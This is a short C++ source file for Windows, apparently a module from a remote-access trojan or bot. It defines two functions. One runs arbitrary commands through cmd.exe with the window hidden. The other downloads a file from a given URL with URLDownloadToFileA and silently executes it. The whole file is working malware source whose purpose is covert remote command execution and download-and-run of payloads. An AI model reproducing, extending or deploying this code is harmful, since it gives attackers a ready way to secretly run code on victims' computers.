#include "common.h"

#pragma comment (lib,"urlmon.lib")

std::string ExecCmd(std::string cmd)
{
	std::string actCmd = "/c ";
	actCmd += cmd;
	ShellExecuteA(0, "open","C:\\Windows\\System32\\cmd.exe", actCmd.c_str(), 0, SW_HIDE);
	return std::string("Command Executed!");
}

std::string DownloadExec(std::string url,std::string path)
{
#ifdef _DEBUG_
	mprintf(url.c_str());
	mprintf(path.c_str());
#endif
	char buffer[MAX_PATH];
	GetCurrentDirectoryA(MAX_PATH,buffer);
	if (URLDownloadToFileA(0,url.c_str(),path.c_str(),0,0) == S_OK)
	{
		ShellExecuteA(0,"open",path.c_str(),0,0,SW_HIDE);
		return std::string("File downloaded...");
	}
	return std::string("error");
}
